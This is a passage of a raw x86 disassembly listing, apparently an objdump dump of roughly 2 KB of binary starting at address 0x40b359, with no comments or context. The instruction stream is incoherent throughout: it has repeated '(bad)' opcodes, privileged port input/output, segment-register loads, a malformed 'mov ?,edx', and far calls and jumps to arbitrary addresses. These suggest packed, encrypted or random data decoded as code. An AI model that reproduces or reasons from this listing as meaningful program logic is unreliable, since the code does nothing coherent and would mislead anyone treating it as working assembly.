  40b359:	fmul   QWORD PTR [eax-0x6018c557]
  40b35f:	push   esi
  40b360:	in     eax,0x61
  40b362:	mov    al,ds:0x2411069a
  40b367:	fs push cs
  40b369:	shl    WORD PTR [esi+0x4f],0xd8
  40b36e:	test   ebx,ecx
  40b370:	push   ebp
  40b371:	sub    bl,bl
  40b373:	sbb    DWORD PTR [edx-0x7771a1cc],eax
  40b379:	shl    DWORD PTR [eax-0x234fe5c7],1
  40b37f:	dec    edx
  40b380:	xchg   edx,eax
  40b381:	push   ecx
  40b382:	aas    
  40b383:	add    edi,DWORD PTR [edi]
  40b385:	out    0x65,al
  40b387:	lea    esp,[ebx+0x595e71e7]
  40b38d:	into   
  40b38e:	jmp    0x24c50e1
  40b393:	in     al,0xd3
  40b395:	in     eax,0x12
  40b397:	cld    
  40b398:	inc    esi
  40b399:	inc    edi
  40b39a:	fild   WORD PTR [ecx]
  40b39c:	outs   dx,BYTE PTR ds:[esi]
  40b39d:	fisub  WORD PTR [ebp-0x72]
  40b3a0:	dec    edi
  40b3a1:	sub    al,0xb4
  40b3a3:	xchg   esp,eax
  40b3a4:	fcom   QWORD PTR ds:0x29d28c20
  40b3aa:	or     BYTE PTR [eax],bl
  40b3ac:	js     0x40b401
  40b3ae:	xchg   edi,eax
  40b3af:	ss loope 0x40b3c3
  40b3b2:	in     al,0xac
  40b3b4:	xchg   ebx,eax
  40b3b5:	or     bh,bh
  40b3b7:	imul   ebx,DWORD PTR [ecx],0xffffffae
  40b3ba:	test   esp,eax
  40b3bc:	mov    esp,esi
  40b3be:	adc    edi,esi
  40b3c0:	ins    BYTE PTR es:[edi],dx
  40b3c1:	cwde   
  40b3c2:	jns    0x40b357
  40b3c4:	mov    esi,0xdc46c5a4
  40b3c9:	dec    edx
  40b3ca:	pop    esp
  40b3cb:	out    dx,eax
  40b3cc:	pop    edi
  40b3cd:	pop    esi
  40b3ce:	test   BYTE PTR [ebx],dh
  40b3d0:	pushf  
  40b3d1:	inc    ecx
  40b3d2:	imul   edi,DWORD PTR [eax+eax*1],0xde9f0259
  40b3d9:	mov    eax,0xb932c495
  40b3de:	sub    esi,esp
  40b3e0:	dec    edx
  40b3e1:	mov    dl,0x85
  40b3e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b3e4:	push   ss
  40b3e5:	repz imul ebp,DWORD PTR [edx-0x1c],0xe68c22d9
  40b3ed:	mov    dl,0x75
  40b3ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b3f0:	mov    ds:0xbaa9c504,eax
  40b3f5:	leave  
  40b3f6:	test   DWORD PTR [esi+0x13],ebx
  40b3f9:	adc    bh,ah
  40b3fb:	fisttp WORD PTR [ebx-0x7f]
  40b3fe:	cmp    cl,BYTE PTR [ebp+0x2619db14]
  40b404:	sub    eax,0xd319c89c
  40b409:	sub    cl,BYTE PTR [edx+0x32]
  40b40c:	sbb    eax,0x127063da
  40b411:	jb     0x40b44b
  40b413:	inc    ecx
  40b414:	iret   
  40b415:	adc    esi,esp
  40b417:	jb     0x40b435
  40b419:	hlt    
  40b41a:	(bad)  
  40b41b:	xor    al,ch
  40b41d:	mov    bh,0x84
  40b41f:	push   ecx
  40b420:	(bad)  
  40b422:	xchg   ecx,eax
  40b423:	or     eax,0x16d96fb2
  40b428:	das    
  40b429:	push   ds
  40b42a:	(bad)  ss:[eax-0x29]
  40b42e:	lahf   
  40b42f:	jae    0x40b405
  40b431:	and    eax,DWORD PTR [ebp+0x452a396e]
  40b437:	mov    ecx,0xdc5f0fb8
  40b43c:	pop    es
  40b43d:	pop    ss
  40b43e:	imul   edi,DWORD PTR [edi+0x35e881ac],0x5c55315f
  40b448:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b449:	sub    eax,0x7a5a80ef
  40b44e:	add    al,0x84
  40b450:	pop    es
  40b451:	dec    ebp
  40b452:	fs (bad) 
  40b455:	es scas eax,DWORD PTR es:[edi]
  40b457:	jnp    0x40b402
  40b459:	out    dx,al
  40b45a:	(bad)  
  40b45b:	adc    al,0xc9
  40b45d:	or     BYTE PTR [esi+eax*2-0x65850bd6],al
  40b464:	rcl    DWORD PTR [ebx],cl
  40b466:	fdivr  DWORD PTR [ebx+0x7662740b]
  40b46c:	lahf   
  40b46d:	and    al,0xb1
  40b46f:	sub    DWORD PTR [edx-0x596961ef],0x5626edc3
  40b479:	sub    eax,0x20e91685
  40b47e:	popf   
  40b47f:	xchg   edi,eax
  40b480:	mov    dl,0x61
  40b482:	xchg   esp,eax
  40b483:	out    dx,al
  40b484:	xchg   BYTE PTR [edx],ah
  40b486:	retf   
  40b487:	in     al,dx
  40b488:	push   edx
  40b489:	add    al,0xf7
  40b48b:	cs mov cl,0x42
  40b48e:	fwait
  40b48f:	fs test eax,0x89fe4896
  40b495:	nop
  40b496:	xor    DWORD PTR [ebx+0x638cfd92],esi
  40b49c:	rcl    DWORD PTR [ecx],1
  40b49e:	push   ds
  40b49f:	mov    ecx,0x894aa2f5
  40b4a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b4a5:	sub    DWORD PTR [ebp-0x43a53c7d],eax
  40b4ab:	push   esi
  40b4ac:	lea    ebx,[esi]
  40b4ae:	pop    esp
  40b4af:	mov    DWORD PTR [ecx-0x66],edx
  40b4b2:	ja     0x40b482
  40b4b4:	int    0x65
  40b4b6:	add    al,0xfa
  40b4b8:	push   eax
  40b4b9:	iret   
  40b4ba:	test   DWORD PTR [eax-0x27f9d892],eax
  40b4c0:	call   0xe58b:0xb98e9ecf
  40b4c7:	enter  0xdf7f,0xde
  40b4cb:	inc    ecx
  40b4cc:	shr    BYTE PTR [ebp-0x6b],cl
  40b4cf:	nop
  40b4d0:	inc    DWORD PTR [esi]
  40b4d2:	or     eax,0x7e113357
  40b4d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b4d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b4d9:	and    BYTE PTR [edx],al
  40b4db:	or     ebx,esi
  40b4dd:	mov    eax,DWORD PTR [ebp+0x7b8d0c8d]
  40b4e3:	inc    edi
  40b4e4:	in     al,dx
  40b4e5:	loopne 0x40b4a9
  40b4e7:	lea    eax,[ebp+0x59bf79d0]
  40b4ed:	adc    eax,0xc71ee01
  40b4f2:	out    dx,eax
  40b4f3:	jge    0x40b4cb
  40b4f5:	inc    esi
  40b4f6:	(bad)  
  40b4f7:	leave  
  40b4f8:	jl     0x40b483
  40b4fa:	clc    
  40b4fb:	mov    eax,ds:0x40ba1139
  40b500:	ins    BYTE PTR es:[edi],dx
  40b501:	jno    0x40b560
  40b503:	and    eax,0x649e1b8
  40b508:	ror    dh,cl
  40b50a:	stos   DWORD PTR es:[edi],eax
  40b50b:	sar    DWORD PTR [edx+0x63ba7c56],0x1f
  40b512:	mov    al,ds:0x6b14383a
  40b517:	pop    es
  40b518:	in     al,0x59
  40b51a:	cmp    eax,0x8823d2e7
  40b51f:	retf   0x5b0
  40b522:	and    dh,BYTE PTR [esi]
  40b524:	inc    edi
  40b525:	add    esi,ecx
  40b527:	jp     0x40b51c
  40b529:	adc    DWORD PTR ds:0xbcb1c14a,edi
  40b52f:	rol    edi,1
  40b531:	inc    esi
  40b532:	mov    bh,0xbb
  40b534:	inc    eax
  40b535:	arpl   di,bp
  40b537:	aaa    
  40b538:	push   edx
  40b539:	repz cdq 
  40b53b:	int    0x8f
  40b53d:	jg     0x40b54a
  40b53f:	xchg   ebx,eax
  40b540:	div    DWORD PTR [ebx-0x60e5ee95]
  40b546:	add    al,BYTE PTR [esi+ecx*2+0xfc7bc41]
  40b54d:	ror    DWORD PTR [ecx-0x25],0xb4
  40b551:	in     eax,dx
  40b552:	test   DWORD PTR [eax+edx*4-0x1c],eax
  40b556:	jne    0x40b555
  40b558:	das    
  40b559:	test   DWORD PTR [esi-0x61],ecx
  40b55c:	mov    ecx,0xd24c216b
  40b561:	sub    edx,DWORD PTR [ebp-0x7ad52c70]
  40b567:	hlt    
  40b568:	lahf   
  40b569:	push   0x64
  40b56b:	into   
  40b56c:	std    
  40b56d:	dec    ebp
  40b56e:	mov    ecx,DWORD PTR [esi+0x3340d765]
  40b574:	(bad)  
  40b575:	mov    ds:0x5dd6c917,al
  40b57a:	fucomi st,st(7)
  40b57c:	pop    esi
  40b57d:	mov    al,0xd5
  40b57f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b580:	inc    edx
  40b581:	cli    
  40b582:	test   DWORD PTR [ecx+0x8f6ca07],esp
  40b588:	lods   al,BYTE PTR ds:[esi]
  40b589:	push   ebp
  40b58a:	std    
  40b58b:	loop   0x40b554
  40b58d:	mov    ecx,0x604f1315
  40b592:	dec    edi
  40b593:	fisttp DWORD PTR [eax+0x66]
  40b596:	in     al,dx
  40b597:	push   eax
  40b598:	mov    BYTE PTR [ecx],dl
  40b59a:	and    bl,BYTE PTR [ebp+0x63]
  40b59d:	sub    ah,BYTE PTR [eax-0x51]
  40b5a0:	ror    DWORD PTR fs:[edx-0x78fe9ac],1
  40b5a7:	push   0xffffffb1
  40b5a9:	addr16 inc eax
  40b5ab:	fs popa 
  40b5ad:	pop    ss
  40b5ae:	loop   0x40b577
  40b5b0:	ja     0x40b591
  40b5b2:	test   DWORD PTR [ebx+0x65],ebp
  40b5b5:	jp     0x40b628
  40b5b7:	clc    
  40b5b8:	shl    BYTE PTR [edi],cl
  40b5ba:	in     al,dx
  40b5bb:	and    al,BYTE PTR [edi-0x4001ee4]
  40b5c1:	adc    ebx,DWORD PTR [eax]
  40b5c3:	mov    ds:0xcf9c9da2,al
  40b5c8:	xor    dh,BYTE PTR [edx+eax*8-0xc]
  40b5cc:	(bad)  
  40b5cd:	xor    bl,ah
  40b5cf:	repnz xchg edx,eax
  40b5d1:	add    dh,ch
  40b5d3:	dec    ebp
  40b5d4:	test   al,0x59
  40b5d6:	dec    DWORD PTR [esi+0x13821330]
  40b5dc:	mov    eax,ds:0xd2002695
  40b5e1:	mov    eax,ds:0x6c488495
  40b5e6:	stc    
  40b5e7:	inc    ebp
  40b5e8:	in     eax,dx
  40b5e9:	adc    DWORD PTR [ecx],ebx
  40b5eb:	hlt    
  40b5ec:	sub    BYTE PTR [esi+0x3f21ac36],al
  40b5f2:	lea    ebx,[eax-0x6e]
  40b5f5:	adc    edi,ebp
  40b5f7:	rcr    DWORD PTR [eax],cl
  40b5f9:	mov    dl,0x1
  40b5fb:	test   eax,0x59401109
  40b600:	pop    ecx
  40b601:	stc    
  40b602:	pop    edx
  40b603:	mov    ds:0x60358d9b,al
  40b608:	jle    0x40b67c
  40b60a:	enter  0xd965,0xff
  40b60e:	xlat   BYTE PTR ds:[ebx]
  40b60f:	fwait
  40b610:	rcl    BYTE PTR [edi-0x65ad9d79],cl
  40b616:	mov    al,0xaa
  40b618:	mov    ds:0xcac58595,al
  40b61d:	mov    edi,0x5c03acd8
  40b622:	not    DWORD PTR [ebp-0x3e115cb3]
  40b628:	xchg   edx,eax
  40b629:	mov    es,WORD PTR [eax+0x3c831bb8]
  40b62f:	jecxz  0x40b641
  40b631:	adc    DWORD PTR [esi-0x1c7e7435],edx
  40b637:	popa   
  40b638:	adc    al,0xdc
  40b63a:	test   DWORD PTR [ebp-0x20bde8e1],edx
  40b640:	icebp  
  40b641:	push   ebp
  40b642:	sub    eax,0x3d9c478e
  40b647:	int    0x36
  40b649:	iret   
  40b64a:	or     BYTE PTR [edi],dh
  40b64c:	jno    0x40b5f4
  40b64e:	test   DWORD PTR [ebx*1-0x249c9e49],esi
  40b655:	aam    0x29
  40b657:	lea    eax,[ecx+0x13]
  40b65a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b65b:	sub    esi,eax
  40b65d:	ret    0xf6e7
  40b660:	shl    dh,cl
  40b662:	iret   
  40b663:	and    DWORD PTR [edi+ebp*8+0x1e5484ab],eax
  40b66a:	fdiv   DWORD PTR [eax]
  40b66c:	pop    ebx
  40b66d:	pop    ecx
  40b66e:	xor    ecx,DWORD PTR [ebx]
  40b670:	imul   ebx,DWORD PTR [eax*4-0x4c35a6ab],0x28ba46f8
  40b67b:	mov    ds,WORD PTR [ebp+0x2b6f9c91]
  40b681:	shl    DWORD PTR [eax],cl
  40b683:	das    
  40b684:	test   eax,0x40ffb643
  40b689:	lahf   
  40b68a:	les    ecx,FWORD PTR [edx+edx*4+0x767d1217]
  40b691:	push   ds
  40b692:	cdq    
  40b693:	cmc    
  40b694:	push   ss
  40b695:	push   eax
  40b696:	mov    al,0xfa
  40b698:	mov    dl,0x1e
  40b69a:	test   ecx,eax
  40b69c:	xchg   esp,eax
  40b69d:	xor    cl,BYTE PTR [esi]
  40b69f:	pop    ecx
  40b6a0:	mov    ebp,0xcc8ef349
  40b6a5:	xchg   ebx,eax
  40b6a6:	cmc    
  40b6a7:	add    bl,BYTE PTR [esi-0x2d39af07]
  40b6ad:	cmp    BYTE PTR [edi],al
  40b6af:	jnp    0x40b700
  40b6b1:	ins    DWORD PTR es:[edi],dx
  40b6b2:	dec    eax
  40b6b3:	or     DWORD PTR [esi+0x565efd11],ebp
  40b6b9:	xchg   ecx,eax
  40b6ba:	sbb    ch,BYTE PTR [ecx+0x10]
  40b6bd:	stc    
  40b6be:	test   DWORD PTR [ebx-0x5321f8e5],ebp
  40b6c4:	push   0xcd46d560
  40b6c9:	jb     0x40b699
  40b6cb:	mov    fs,WORD PTR [ecx]
  40b6cd:	inc    esi
  40b6ce:	nop
  40b6cf:	and    eax,0x3e340cf
  40b6d4:	ror    BYTE PTR [edi-0x709fb543],cl
  40b6da:	push   0xffffffef
  40b6dc:	ss add eax,0x91a73d4f
  40b6e2:	mov    ds:0x3c1e20ac,al
  40b6e7:	fwait
  40b6e8:	shl    al,cl
  40b6ea:	xchg   esp,eax
  40b6eb:	aad    0xdd
  40b6ed:	jge    0x40b69e
  40b6ef:	or     eax,0xe84a119e
  40b6f4:	lahf   
  40b6f5:	in     al,dx
  40b6f6:	repz dec ebp
  40b6f8:	pop    ebp
  40b6f9:	mov    ds:0xe9892785,eax
  40b6fe:	jmp    0x40b6ad
  40b700:	hlt    
  40b701:	aam    0x16
  40b703:	xchg   ebx,eax
  40b704:	pop    esi
  40b705:	push   edi
  40b706:	out    dx,al
  40b707:	sbb    eax,0x3ada27a
  40b70c:	int3   
  40b70d:	add    al,BYTE PTR [ebp+0x1f249c27]
  40b713:	mov    cl,dh
  40b715:	inc    edx
  40b716:	pop    ds
  40b717:	mov    ss,ebp
  40b719:	outs   dx,BYTE PTR ds:[esi]
  40b71a:	add    BYTE PTR ds:0x44424166,ah
  40b720:	shr    BYTE PTR [ebx],cl
  40b722:	bound  ebx,QWORD PTR [eax]
  40b724:	pop    ecx
  40b725:	(bad)  
  40b726:	cli    
  40b727:	fst    DWORD PTR ds:[edi]
  40b72a:	sub    DWORD PTR [edi-0x3b],esp
  40b72d:	mov    ebx,0x66af7a8a
  40b732:	inc    eax
  40b733:	rcl    BYTE PTR [edx],cl
  40b735:	leave  
  40b736:	test   DWORD PTR [esi+0x6fa1b54e],edx
  40b73c:	dec    ebp
  40b73d:	add    al,0x46
  40b73f:	xchg   edi,eax
  40b740:	lea    ebp,[edx-0xc]
  40b743:	pop    ebp
  40b744:	test   al,0x1
  40b746:	push   edx
  40b747:	mov    eax,ds:0xbe8455d4
  40b74c:	pushf  
  40b74d:	xor    al,0x4f
  40b74f:	js     0x40b7c6
  40b751:	pop    ebp
  40b752:	jnp    0x40b6e2
  40b754:	jmp    0x9e57ed67
  40b759:	sub    eax,0x81d2dc82
  40b75e:	jmp    0x81e88774
  40b763:	inc    edx
  40b764:	out    0x11,al
  40b766:	not    ah
  40b768:	and    al,0xa5
  40b76a:	(bad)  
  40b76b:	push   edx
  40b76c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b76d:	fiadd  DWORD PTR [ebp-0x38f9da87]
  40b773:	(bad)  
  40b774:	fdivr  DWORD PTR [esi-0x606c71a7]
  40b77a:	scas   al,BYTE PTR es:[edi]
  40b77b:	(bad)  
  40b77c:	js     0x40b7bc
  40b77e:	inc    eax
  40b77f:	(bad)  
  40b780:	shl    BYTE PTR [esi-0x1],cl
  40b783:	test   BYTE PTR [eax*1+0x1e861554],0x12
  40b78b:	mov    eax,ds:0xfb4e4f9e
  40b790:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b791:	gs jo  0x40b76e
  40b794:	shr    BYTE PTR [ebx-0x378781ff],cl
  40b79a:	ret    
  40b79b:	xchg   ebx,eax
  40b79c:	sbb    al,0xd9
  40b79e:	xchg   edi,eax
  40b79f:	not    dl
  40b7a1:	sub    BYTE PTR [ecx+ebp*1+0x1b62dede],0xd2
  40b7a9:	or     edx,DWORD PTR [ebp-0x42]
  40b7ac:	cdq    
  40b7ad:	jle    0x40b7ae
  40b7af:	aas    
  40b7b0:	xchg   edi,eax
  40b7b1:	adc    DWORD PTR [edi-0x2c],esi
  40b7b4:	jns    0x40b7f7
  40b7b6:	add    BYTE PTR [esi-0x2b],ah
  40b7b9:	ins    DWORD PTR es:[edi],dx
  40b7ba:	jmp    0x49b7aaf
  40b7bf:	sub    eax,0x21bf6921
  40b7c4:	(bad)  
  40b7c5:	adc    DWORD PTR [ebx+0x451accdc],esp
  40b7cb:	out    0x18,eax
  40b7cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b7ce:	test   eax,edx
  40b7d0:	or     edi,DWORD PTR [edx+0x62d4f30b]
  40b7d6:	scas   eax,DWORD PTR es:[edi]
  40b7d7:	mov    ebp,edi
  40b7d9:	inc    edx
  40b7da:	mov    ecx,0xb2863cce
  40b7df:	fidivr DWORD PTR [esp+edi*8+0x5b]
  40b7e3:	pushf  
  40b7e4:	shl    BYTE PTR [edx],cl
  40b7e6:	xor    BYTE PTR [eax-0x5e55362a],dh
  40b7ec:	popf   
  40b7ed:	pop    ss
  40b7ee:	xchg   edx,eax
  40b7ef:	cwde   
  40b7f0:	mov    BYTE PTR [ebx-0x42fbaf1b],0x67
  40b7f7:	hlt    
  40b7f8:	sar    BYTE PTR [ecx+0x24],cl
  40b7fb:	adc    BYTE PTR ds:0x13774ef6,cl
  40b801:	sbb    al,0x8d
  40b803:	inc    edx
  40b804:	cld    
  40b805:	add    edi,DWORD PTR [ecx]
  40b807:	(bad)  
  40b808:	test   esp,0x81dc4f2d
  40b80e:	data16 loope 0x40b7e3
  40b811:	in     eax,0xd1
  40b813:	and    eax,0x8eb1162b
  40b818:	jae    0x40b850
  40b81a:	or     BYTE PTR [edx],dh
  40b81c:	or     eax,0x2acf7b01
  40b821:	test   BYTE PTR fs:[edi],dl
  40b824:	xchg   edx,eax
  40b825:	mov    BYTE PTR [ebx-0x10],bl
  40b828:	ja     0x40b803
  40b82a:	clc    
  40b82b:	mov    fs,WORD PTR [ebx]
  40b82d:	int    0x11
  40b82f:	outs   dx,DWORD PTR ds:[esi]
  40b830:	mov    ecx,0xd2b2b7fc
  40b835:	push   eax
  40b836:	xchg   DWORD PTR [ebp+0xe015960],ecx
  40b83c:	or     bl,BYTE PTR [eax+ebp*8]
  40b83f:	sbb    eax,0x5f
  40b842:	stos   BYTE PTR es:[edi],al
  40b843:	pop    esi
  40b844:	dec    edi
  40b845:	ja     0x40b80c
  40b847:	sbb    esp,eax
  40b849:	aas    
  40b84a:	enter  0x5826,0x62
  40b84e:	xchg   edx,eax
  40b84f:	cmp    ch,al
  40b851:	pushf  
  40b852:	mov    al,ds:0xa459b218
  40b857:	jbe    0x40b84c
  40b859:	call   0x9ee8:0x20de8ee7
  40b860:	xlat   BYTE PTR ds:[ebx]
  40b861:	adc    BYTE PTR [eax+0x2e85d269],0x6e
  40b868:	adc    al,0x80
  40b86a:	push   edi
  40b86b:	cwde   
  40b86c:	xchg   ebx,eax
  40b86d:	adc    DWORD PTR [ebp-0x7a],edx
  40b870:	cmp    al,0x2c
  40b872:	mov    ebx,0x85103151
  40b877:	dec    esp
  40b878:	popa   
  40b879:	mov    ch,0xb6
  40b87b:	or     al,0xf0
  40b87d:	jle    0x40b8bf
  40b87f:	loop   0x40b847
  40b881:	pop    ss
  40b882:	clc    
  40b883:	out    0xb4,eax
  40b885:	or     DWORD PTR [esp+eiz*8],eax
  40b888:	add    eax,0xd2370edb
  40b88d:	xchg   ebp,eax
  40b88e:	ins    BYTE PTR es:[edi],dx
  40b88f:	rol    BYTE PTR [ecx+0x6b7446c5],1
  40b895:	add    esi,esp
  40b897:	push   0x7d
  40b899:	sahf   
  40b89a:	cmp    bl,BYTE PTR [edx-0x61]
  40b89d:	imul   edx,DWORD PTR [eax+0x38f2d278],0x151417d9
  40b8a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b8a8:	fcom   QWORD PTR [ecx]
  40b8aa:	cmc    
  40b8ab:	jp     0x40b8b1
  40b8ad:	mov    dl,ah
  40b8af:	add    BYTE PTR [ebp+ebx*2-0x7c],cl
  40b8b3:	inc    esi
  40b8b4:	fbld   TBYTE PTR [edi-0x7f]
  40b8b7:	jns    0x40b900
  40b8b9:	loope  0x40b8a6
  40b8bb:	mov    gs,WORD PTR [ebp-0x67ca6c00]
  40b8c1:	jne    0x40b91e
  40b8c3:	pop    es
  40b8c4:	aad    0xd9
  40b8c6:	mov    ah,0xc
  40b8c8:	int3   
  40b8c9:	push   ds
  40b8ca:	loop   0x40b944
  40b8cc:	cmp    edx,esp
  40b8ce:	mov    ch,0xef
  40b8d0:	in     al,0x6
  40b8d2:	push   es
  40b8d3:	mov    dl,0x69
  40b8d5:	retf   0xfafe
  40b8d8:	inc    ebx
  40b8d9:	jo     0x40b861
  40b8db:	push   cs
  40b8dc:	les    ebp,FWORD PTR [ebx-0x7e]
  40b8df:	mov    eax,0x1a401e7c
  40b8e4:	int    0x80
  40b8e6:	mov    ds:0x88648776,al
  40b8eb:	mov    ah,0xe2
  40b8ed:	xchg   ecx,eax
  40b8ee:	cdq    
  40b8ef:	and    esp,DWORD PTR [ebp-0x1]
  40b8f2:	cli    
  40b8f3:	(bad)  
  40b8f4:	push   0x7b1bbd11
  40b8f9:	or     DWORD PTR [eax],ebp
  40b8fb:	jae    0x40b94f
  40b8fd:	xchg   ecx,eax
  40b8fe:	(bad)  
  40b8ff:	xchg   edi,eax
  40b900:	sar    BYTE PTR [esi+0x5bfafe46],cl
  40b906:	pop    es
  40b907:	mov    dl,cl
  40b909:	in     eax,dx
  40b90a:	clc    
  40b90b:	mov    es,WORD PTR [edx+0x5d590378]
  40b911:	cmp    ah,BYTE PTR ds:0x5a18d28c
  40b917:	cmp    esp,edx
  40b919:	lods   eax,DWORD PTR ds:[esi]
  40b91a:	out    0xcf,eax
  40b91c:	lea    edx,[ecx]
  40b91e:	cs jo  0x40b968
  40b921:	popf   
  40b922:	ret    
  40b923:	imul   edi,DWORD PTR [ecx-0x47],0xffffff85
  40b927:	retf   
  40b928:	imul   BYTE PTR [eax-0x70404f0e]
  40b92e:	sbb    BYTE PTR [esi+0xc4e532d],cl
  40b934:	shl    DWORD PTR [eax],0x7a
  40b937:	adc    dl,0xab
  40b93a:	les    ecx,FWORD PTR [eax-0x46]
  40b93d:	outs   dx,DWORD PTR ds:[esi]
  40b93e:	add    ecx,DWORD PTR [esi-0x42]
  40b941:	adc    DWORD PTR [edx-0x32638cfc],eax
  40b947:	inc    ecx
  40b948:	ja     0x40b96f
  40b94a:	test   ecx,edi
  40b94c:	inc    edi
  40b94d:	lods   eax,DWORD PTR ds:[esi]
  40b94e:	dec    ebx
  40b94f:	push   edi
  40b950:	js     0x40b95d
  40b952:	cmp    eax,0xd46160af
  40b957:	mov    ?,edx
  40b959:	mov    eax,ds:0x3bb5ab1a
  40b95e:	(bad)  
  40b95f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b960:	rol    dl,cl
  40b962:	clc    
  40b963:	pop    edx
  40b964:	aam    0xc8
  40b966:	pop    ax
  40b968:	sub    DWORD PTR [eax],eax
  40b96a:	(bad)  
  40b96b:	ja     0x40b91c
  40b96d:	adc    edx,ebx
  40b96f:	cwde   
  40b970:	fiadd  DWORD PTR [ebp-0x402cfa4f]
  40b976:	rol    esp,cl
  40b978:	jns    0x40b9d7
  40b97a:	shl    DWORD PTR [esi-0x62],cl
  40b97d:	jle    0x40b9c0
  40b97f:	loopne 0x40b96e
  40b981:	adc    esp,eax
  40b983:	mov    esi,edi
  40b985:	loopne 0x40b9c0
  40b987:	in     eax,dx
  40b988:	xor    dh,0x86
  40b98b:	ins    DWORD PTR es:[edi],dx
  40b98c:	mov    al,ds:0xd24c1425
  40b991:	test   eax,0x6d78cfa6
  40b996:	sub    dl,BYTE PTR [ebx-0x518abf4]
  40b99c:	sbb    BYTE PTR [ecx-0x2a],dl
  40b99f:	hlt    
  40b9a0:	mov    al,ds:0x158385c6
  40b9a5:	xchg   edi,eax
  40b9a6:	mov    eax,ds:0x5edbaee0
  40b9ab:	imul   edx,DWORD PTR [esi],0x1e
  40b9ae:	fimul  DWORD PTR ds:0xcff04320
  40b9b4:	in     eax,0x41
  40b9b6:	adc    ecx,esi
  40b9b8:	out    0x2c,al
  40b9ba:	sbb    cl,BYTE PTR [esi]
  40b9bc:	leave  
  40b9bd:	inc    edx
  40b9be:	xor    DWORD PTR [ebx-0x73a07a78],ebx
  40b9c4:	push   esp
  40b9c5:	pop    eax
  40b9c6:	jbe    0x40ba3d
  40b9c8:	scas   eax,DWORD PTR es:[edi]
  40b9c9:	sbb    eax,DWORD PTR [ebp-0x52]
  40b9cc:	enter  0x88d8,0x35
  40b9d0:	(bad)  
  40b9d1:	sub    DWORD PTR [ebx+0x2d],esp
  40b9d4:	repnz xchg ecx,eax
  40b9d6:	and    eax,0xe411f0be
  40b9db:	lock fucomip st,st(3)
  40b9de:	das    
  40b9df:	in     al,dx
  40b9e0:	ffree  st(2)
  40b9e2:	test   bh,bh
  40b9e4:	test   DWORD PTR [ebp-0x5f],ebp
  40b9e7:	dec    esi
  40b9e8:	mov    ecx,0x40bb68c6
  40b9ed:	push   edi
  40b9ee:	mov    ch,0x4d
  40b9f0:	mov    esi,0x4a8f9426
  40b9f5:	xchg   esi,eax
  40b9f6:	out    0xce,al
  40b9f8:	and    al,0x35
  40b9fa:	leave  
  40b9fb:	jae    0x40ba7c
  40b9fd:	ss pop esp
  40b9ff:	imul   BYTE PTR [esp+edi*4-0x7b]
  40ba03:	or     ebx,ebx
  40ba05:	bound  esp,QWORD PTR [edx-0x79c86a33]
  40ba0b:	mov    gs,WORD PTR [esi+0x9970795]
  40ba11:	addr16 xchg edx,eax
  40ba13:	pop    es
  40ba14:	shr    cl,cl
  40ba16:	adc    BYTE PTR [ebx-0xe0f5ec1],dl
  40ba1c:	dec    ebx
  40ba1d:	pop    ds
  40ba1e:	xchg   ecx,eax
  40ba1f:	mov    dl,0x2a
  40ba21:	xor    BYTE PTR [ebp+0x3a],bl
  40ba24:	shl    BYTE PTR [ebp-0x5],0xbd
  40ba28:	shl    BYTE PTR [edi-0x5f710a50],cl
  40ba2e:	(bad)  
  40ba2f:	jge    0x40b9e7
  40ba31:	adc    eax,ecx
  40ba33:	or     ecx,esp
  40ba35:	test   DWORD PTR [eax-0x78b74100],0x2d624c38
  40ba3f:	sahf   
  40ba40:	pop    esp
  40ba41:	call   0x9fb0:0x73abeeef
  40ba48:	jg     0x40ba6c
  40ba4a:	sar    BYTE PTR [ecx],cl
  40ba4c:	jb     0x40ba50
  40ba4e:	shl    edx,1
  40ba50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba51:	and    eax,DWORD PTR [ebp-0x390f63a0]
  40ba57:	cmp    eax,0x8ebe9a1e
  40ba5c:	adc    esi,DWORD PTR cs:[ecx-0x33]
  40ba60:	add    cl,BYTE PTR ds:0x47d984a1
  40ba66:	fdiv   QWORD PTR [eax-0x54]
  40ba69:	xor    BYTE PTR [edx],bh
  40ba6b:	xcrypt-ofb (bad)
  40ba6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba6d:	stos   DWORD PTR es:[edi],eax
  40ba6e:	dec    esi
  40ba6f:	and    eax,0x3abe69a9
  40ba74:	xor    cl,BYTE PTR [edx]
  40ba76:	inc    ebp
  40ba77:	jge    0x40ba43
  40ba79:	jecxz  0x40ba14
  40ba7b:	mov    ds,ecx
  40ba7d:	ret    0x2ac3
  40ba80:	test   DWORD PTR [ebx+0x58],ecx
  40ba83:	sbb    dl,dl
  40ba85:	xchg   DWORD PTR [eax-0x692e4dbc],edx
  40ba8b:	rcr    DWORD PTR [eax+0x6493181d],1
  40ba91:	mov    ebp,0x9fb3ce41
  40ba96:	push   ebx
  40ba97:	dec    eax
  40ba98:	sar    BYTE PTR [ecx],cl
  40ba9a:	iret   
  40ba9b:	bound  ebx,QWORD PTR [edx-0x59a868cc]
  40baa1:	adc    DWORD PTR [ecx+0x4e],edi
  40baa4:	mov    eax,ds:0x41329b21
  40baa9:	sti    
  40baaa:	shr    DWORD PTR [ebp+0x22159dc8],1
  40bab0:	rcl    BYTE PTR [eax],cl
  40bab2:	jmp    0x2356a3f9
  40bab7:	lea    esi,[edx+0x3760a003]
  40babd:	xor    BYTE PTR [eax],dl
  40babf:	repz mov dl,0xb2
  40bac2:	push   ss
  40bac3:	jg     0x40ba9a
  40bac5:	sub    eax,0x11eda508
  40baca:	mov    DWORD PTR [edx-0x54cc7187],eax
  40bad0:	push   ecx
  40bad1:	loopne 0x40ba58
  40bad3:	out    0xbb,eax
  40bad5:	jmp    0xec032bb
  40bada:	xor    eax,0x859691d6
  40badf:	inc    edx
  40bae0:	(bad)  
  40bae1:	jo     0x40bab3
